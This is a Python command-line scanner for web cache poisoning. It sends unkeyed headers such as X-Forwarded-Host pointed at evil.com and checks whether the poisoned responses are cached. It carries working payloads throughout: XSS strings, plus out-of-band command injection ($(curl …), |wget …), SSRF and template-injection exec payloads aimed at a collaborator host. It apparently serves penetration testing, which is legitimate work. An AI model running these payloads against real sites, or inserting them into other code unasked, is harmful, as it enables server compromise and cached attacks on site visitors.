import requests
import time
import sys
import random
import string
from typing import Dict, List, Tuple
from dataclasses import dataclass
from concurrent.futures import ThreadPoolExecutor
import argparse

@dataclass
class CacheTestResult:
    is_cached: bool
    time_to_cache: float
    vulnerable_headers: List[str]
    cache_control: str
    cache_hit_header: str

class CachePoisonTester:
    def __init__(self, target_url: str, verbose: bool = False, test_xss: bool = False, 
                 burp_collab_url: str = None, proxy: dict = None):
        self.target_url = target_url
        self.verbose = verbose
        self.test_xss = test_xss
        self.session = requests.Session()
        
        # Configure proxy if provided
        if proxy:
            self.session.proxies = proxy
            # Disable SSL verification when using Burp proxy
            self.session.verify = False
            # Suppress SSL warnings
            import urllib3
            urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
        
        self.burp_collab_url = burp_collab_url
        
        # Out-of-band payloads using Burp Collaborator
        self.oob_payloads = [
            # XSS with out-of-band detection
            (f'"><img src=//{burp_collab_url}>', 'img-oob'),
            (f'<script>fetch("//{burp_collab_url}")</script>', 'fetch-oob'),
            
            # Blind RCE attempts
            (f'$(curl {burp_collab_url})', 'curl-oob'),
            (f'`ping {burp_collab_url}`', 'ping-oob'),
            (f'"|wget {burp_collab_url}', 'wget-oob'),
            
            # SSRF attempts
            (f'http://{burp_collab_url}', 'ssrf-oob'),
            (f'https://{burp_collab_url}', 'ssrf-https-oob'),
            
            # Template injection
            ('{{getcookie("x")+"|"+exec("import socket;socket.gethostbyname(\''+burp_collab_url+'\')")}}', 'ssti-dns'),
        ]
        
        # Safe test payloads for XSS detection
        self.xss_payloads = [
            ('<script>console.log(1)</script>', 'script injection'),
            ('"><img src=x onerror=console.log(2)>', 'image onerror'),
            ('\'-alert(3)-\'', 'quote escape'),
            ('javascript:console.log(4)//', 'javascript protocol')
        ]
        
        # Headers that might influence caching but aren't included in cache key
        self.test_headers = {
            'X-Forwarded-Host': 'evil.com',
            'X-Host': 'evil.com',
            'X-Forwarded-Server': 'evil.com',
            'X-HTTP-Host-Override': 'evil.com',
            'X-Forwarded-Proto': 'http',
            'X-Original-URL': '/admin',
            'X-Rewrite-URL': '/admin',
            'X-Custom-IP-Authorization': '127.0.0.1'
        }
        
    def generate_random_param(self) -> str:
        """Generate random parameter to bypass cache"""
        return ''.join(random.choices(string.ascii_letters + string.digits, k=8))

    def detect_cache_behavior(self) -> CacheTestResult:
        """Detect if target is using caching and determine cache timing"""
        print("[*] Detecting cache behavior...")
        
        # First request to prime cache
        param = self.generate_random_param()
        url = f"{self.target_url}?cb={param}"
        start_time = time.time()
        r1 = self.session.get(url)
        time1 = time.time() - start_time

        # Second request to same URL to check for caching
        start_time = time.time()
        r2 = self.session.get(url)
        time2 = time.time() - start_time

        # Check common cache headers
        cache_headers = [
            'X-Cache',
            'X-Cache-Hit',
            'CF-Cache-Status',
            'Age',
            'X-Cached'
        ]
        
        cache_hit_header = None
        for header in cache_headers:
            if header.lower() in r2.headers:
                cache_hit_header = f"{header}: {r2.headers[header]}"
                break

        is_cached = (time2 < time1 * 0.5) or cache_hit_header is not None
        
        return CacheTestResult(
            is_cached=is_cached,
            time_to_cache=time1,
            vulnerable_headers=[],
            cache_control=r1.headers.get('Cache-Control', 'Not Set'),
            cache_hit_header=cache_hit_header or 'Not Found'
        )

    def test_header_influence(self, header: str, value: str) -> Tuple[bool, requests.Response]:
        """Test if a specific header influences the response"""
        # Make request with test header
        r1 = self.session.get(
            self.target_url,
            headers={header: value}
        )
        
        # Make request without test header
        r2 = self.session.get(self.target_url)
        
        # Compare responses
        return (
            r1.text != r2.text or r1.status_code != r2.status_code,
            r1
        )

    def find_vulnerable_headers(self) -> List[str]:
        """Identify headers that influence the response"""
        print("[*] Testing for header influence...")
        vulnerable = []
        
        with ThreadPoolExecutor(max_workers=5) as executor:
            future_to_header = {
                executor.submit(self.test_header_influence, header, value): header
                for header, value in self.test_headers.items()
            }
            
            for future in future_to_header:
                header = future_to_header[future]
                try:
                    influences, response = future.result()
                    if influences:
                        vulnerable.append(header)
                        if self.verbose:
                            print(f"[+] Found influential header: {header}")
                except Exception as e:
                    print(f"[!] Error testing {header}: {str(e)}")

        return vulnerable

    def test_xss_payload(self, header: str, payload: str, payload_type: str) -> bool:
        """Test if an XSS payload can be cached"""
        try:
            # Send the XSS payload
            poison_headers = {header: payload}
            r1 = self.session.get(self.target_url, headers=poison_headers)
            
            # Wait briefly for cache
            time.sleep(2)
            
            # Check if payload was cached
            r2 = self.session.get(self.target_url)
            
            if payload in r2.text:
                print(f"[!] Potential XSS via {header} using {payload_type}")
                print(f"[!] Payload: {payload}")
                return True
                
        except Exception as e:
            if self.verbose:
                print(f"[!] Error testing XSS payload: {str(e)}")
                
        return False

    def verify_cache_poisoning(self, vulnerable_headers: List[str]) -> bool:
        """Verify if cache poisoning is possible with identified headers"""
        print("[*] Verifying cache poisoning possibility...")
        
        if not vulnerable_headers:
            return False

        # Generate unique test value
        test_value = f"testpayload{self.generate_random_param()}"
        
        # Try to poison cache with each vulnerable header
        for header in vulnerable_headers:
            try:
                # Send poisoning request
                poison_headers = {header: test_value}
                r1 = self.session.get(self.target_url, headers=poison_headers)
                
                # Wait briefly for cache to update
                time.sleep(2)
                
                # Check if poisoned response is cached
                r2 = self.session.get(self.target_url)
                
                if test_value in r2.text:
                    print(f"[!] Cache poisoning confirmed with header: {header}")
                    return True
                    
            except Exception as e:
                print(f"[!] Error during verification: {str(e)}")
                
        return False

    def test_injection_vectors(self, vulnerable_headers: List[str]) -> None:
        """Test for XSS and other injection possibilities"""
        print("[*] Testing for XSS and OOB vectors...")
        
        # Test Burp Collaborator payloads if URL is provided
        if self.burp_collab_url:
            print(f"[*] Testing OOB interactions with {self.burp_collab_url}")
            print("[*] Check your Burp Collaborator client for interactions")
            
            for header in vulnerable_headers:
                for payload, payload_type in self.oob_payloads:
                    try:
                        # Send the OOB payload
                        poison_headers = {header: payload}
                        r1 = self.session.get(self.target_url, headers=poison_headers)
                        
                        print(f"[+] Sent {payload_type} payload via {header}")
                        print(f"    Payload: {payload}")
                        
                        # Wait briefly for cache
                        time.sleep(2)
                        
                        # Check if payload was cached
                        r2 = self.session.get(self.target_url)
                        
                        if payload in r2.text:
                            print(f"[!] OOB payload was cached via {header}")
                            print("[!] Check Burp Collaborator for delayed interactions")
                            
                    except Exception as e:
                        if self.verbose:
                            print(f"[!] Error testing OOB payload: {str(e)}")
        
        print("[*] Testing for XSS vectors...")
        
        for header in vulnerable_headers:
            for payload, payload_type in self.xss_payloads:
                if self.test_xss_payload(header, payload, payload_type):
                    print(f"[!] Cached XSS possible with {header}")
                    print("[!] This could lead to persistent XSS affecting multiple users")
                    print("[*] Suggested fixes:")
                    print("    - Include this header in the cache key")
                    print("    - Implement proper output encoding")
                    print("    - Add Content-Security-Policy headers")
                    return True
        return False

    def run_test(self) -> None:
        """Run complete cache poisoning test"""
        print(f"[*] Testing {self.target_url} for cache poisoning vulnerability")
        
        # Step 1: Detect cache behavior
        cache_result = self.detect_cache_behavior()
        
        if not cache_result.is_cached:
            print("[-] Target does not appear to be using caching")
            return
            
        print(f"[+] Cache detected:")
        print(f"    Cache-Control: {cache_result.cache_control}")
        print(f"    Cache Hit Indicator: {cache_result.cache_hit_header}")
        
        # Step 2: Find vulnerable headers
        vulnerable_headers = self.find_vulnerable_headers()
        
        if not vulnerable_headers:
            print("[-] No vulnerable headers found")
            return
            
        print(f"[+] Found {len(vulnerable_headers)} potentially vulnerable headers")
        
        # Step 3: Verify cache poisoning
        if self.verify_cache_poisoning(vulnerable_headers):
            print("[!] Target is VULNERABLE to web cache poisoning!")
            print("[!] Vulnerable headers:")
            for header in vulnerable_headers:
                print(f"    - {header}")
        else:
            print("[-] Could not confirm cache poisoning vulnerability")

def main():
    parser = argparse.ArgumentParser(description='Test for web cache poisoning vulnerabilities')
    parser.add_argument('url', help='Target URL to test')
    parser.add_argument('-v', '--verbose', action='store_true', help='Enable verbose output')
    parser.add_argument('--xss', action='store_true', help='Test for XSS vectors')
    parser.add_argument('--custom-payload', help='Test a custom payload for injection')
    parser.add_argument('--burp-collab', help='Burp Collaborator URL for OOB testing')
    parser.add_argument('--proxy', help='Proxy URL (e.g., http://127.0.0.1:8080)')
    parser.add_argument('--https-proxy', help='HTTPS Proxy URL (if different from HTTP proxy)')
    args = parser.parse_args()

    try:
        # Configure proxy settings
        proxy_config = None
        if args.proxy:
            proxy_config = {
                'http': args.proxy,
                'https': args.https_proxy or args.proxy
            }
            print(f"[*] Using proxy: {proxy_config}")

        tester = CachePoisonTester(
            args.url, 
            verbose=args.verbose,
            burp_collab_url=args.burp_collab,
            proxy=proxy_config
        )
        tester.run_test()
    except KeyboardInterrupt:
        print("\n[!] Test interrupted by user")
        sys.exit(1)
    except Exception as e:
        print(f"[!] Error: {str(e)}")
        sys.exit(1)

if __name__ == "__main__":
    main()
